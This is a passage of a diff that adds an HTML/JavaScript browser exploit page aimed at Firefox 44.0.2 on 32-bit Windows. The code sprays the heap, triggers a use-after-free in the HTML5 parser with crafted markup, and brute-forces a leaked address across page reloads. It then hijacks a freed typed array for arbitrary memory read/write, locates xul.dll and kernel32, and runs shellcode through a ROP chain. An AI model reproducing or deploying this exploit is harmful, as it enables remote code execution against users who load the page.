+            for (let j = 0; j < 0x10000; j++) {
+                /* 0x11223344, 0x55667788 */
+                array[i][j] = 2.5160082934009793e+103;
+            }
+        }
+        return array;
+    };
+
+    /*
+     * Not sure how reliable this is, but on 3 machines running win10 on
+     * bare metal and on a few VMs with win7/win10 (all with and without
+     * EMET), [xul!nsHtml5Atoms::style] was always found within
+     * 0x[00a-1c2]f[a-f]6(c|e)0
+     */
+    this.getNextAddr = function(current) {
+        const start = 0x00afa6c0;
+
+        if (!current) {
+            return start;
+        }
+
+        if ((current >> 20) < 0x150) {
+            return current + 0x100000*(this.ptrNum-1);
+        }
+
+        if ((current >> 12 & 0xf) !== 0xf) {
+            return (current + 0x1000) & ~(0xfff << 20) | (start >> 20) << 20;
+        }
+
+        if ((current >> 4 & 0xf) === 0xc) {
+            return start + 0x20;
+        }
+        throw new Error("out of guesses");
+    };
+
+    /*
+     * Returns the `name' from the last node with a decremented
+     * refcount, if any are found
+     */
+    this.findStyleAddr = function(nodes) {
+        const size = this.nsHtml5StackNodeSize / 4;
+
+        for (let i = 64 * size - 1; i >= 0; i -= size) {
+            if (nodes[i] === this.refcount - 1) {
+                return nodes[i-5];
+            }
+        }
+    };
+
+    /*
+     * Locates a subarray in `array' that overlaps with `nodes'
+     */
+    this.findArray = function(nodes, array) {
+        /* index 0..3 is metadata for `array' */
+        nodes[4] = 0x41414141;
+        nodes[5] = 0x42424242;
+
+        for (let i = 0; i < array.length; i++) {
+            if (array[i][0] === 156842099330.5098) {
+                return array[i];
+            }
+        }
+        throw new Error("Uint32Array hijack failed");
+    };
+}
+
+function log(msg) {
+    dump("=> " + msg + "\n");
+    console.log("=> " + msg);
+}
+
+let nodes;
+let hijacked;
+window.onload = function() {
+    if (!navigator.userAgent.match(/Windows NT [0-9.]+; WOW64; rv:44\.0/)) {
+        throw new Error("unsupported user-agent");
+    }
+
+    const spray = new Spray();
+
+    /*
+     * spray nodes
+     */
+    let bruteforce = true;
+    let addr = spray.getNextAddr(0);
+    const href = window.location.href.split("?");
+    if (href.length === 2) {
+        const query = href[1].split("=");
+        if (query[0] === "style") {
+            bruteforce = false;
+        }
+        addr = parseInt(query[1]);
+    }
+    nodes = spray.nodes(addr, bruteforce);
+
+    /*
+     * spray node pointers and trigger the bug
+     */
+    document.body.innerHTML = "<svg><img id='AAAA'>";
+    const pointers = spray.pointers();
+    document.getElementById("AAAA").innerHTML = "<title><template><td><tr><title><i></tr><style>td</style>";
+
+    /*
+     * on to the next run...
+     */
+    if (bruteforce === true) {
+        const style = spray.findStyleAddr(nodes);
+        nodes = null;
+        if (style) {
+            window.location = href[0] + "?style=" + style;
+        } else {
+            window.location = href[0] + "?continue=" + spray.getNextAddr(addr);
+        }
+        return;
+    }
+
+    /*
+     * reallocate the freed Uint32Array
+     */
+    hijacked = spray.findArray(nodes, spray.arrays());
+
+    /*
+     * setup helpers
+     */
+    const rwx = new ReadWriteExecute(spray.nodeBase, nodes, hijacked);
+
+    /* The first 4 bytes of the previously leaked [xul!nsHtml5Atoms::style]
+     * contain the address of xul!PermanentAtomImpl::`vftable'.
+     *
+     * Note that the subtracted offset is specific to firefox 44.0.2.
+     * However, since we can read arbitrary memory by this point, the
+     * base of xul could easily (albeit perhaps somewhat slowly) be
+     * located by searching for a PE signature */
+    const xulBase = rwx.readDWord(addr) - 0x1c1f834;
+
+    log("style found at 0x" + addr.toString(16));
+    log("xul.dll found at 0x" + xulBase.toString(16));
+
+    const xulPE = new PortableExecutable(xulBase, rwx);
+    xulPE.read();
+    const rop = new ROPHelper(xulPE, rwx);
+    const kernel32 = new KERNEL32(rop, xulPE, rwx);
+    const kernel32handle = kernel32.GetModuleHandleA("kernel32.dll");
+    const kernel32PE = new PortableExecutable(kernel32handle, rwx);
+    kernel32PE.read();
+    const ntdll = new NTDLL(rop, kernel32PE, rwx);
+    const icuuc55 = new ICUUC55(rop, xulPE, rwx);
+
+    /*
+     * execute shellcode
+     */
+    const stack = ntdll.getStackLimit(kernel32.GetCurrentThread());
+    const exec = icuuc55.alloc(stack, shellcode.length);
+    const proc = xulPE.search("kernel32.dll", "GetProcAddress");
+    rwx.writeString(exec, shellcode.join(""));
+    rop.execute(exec, [kernel32handle, proc], true);
+};
+</script>
+</head>
+</html>
